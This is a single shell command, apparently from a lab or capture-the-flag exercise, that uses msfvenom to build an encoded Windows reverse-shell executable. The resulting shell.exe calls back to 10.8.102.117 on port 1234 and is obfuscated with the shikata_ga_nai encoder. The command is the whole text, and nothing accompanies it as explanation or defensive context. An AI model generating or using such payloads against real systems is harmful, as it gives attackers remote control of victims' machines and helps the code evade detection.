msfvenom --platform Windows -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=10.8.102.117 LPORT=1234 -f exe -o shell.exe


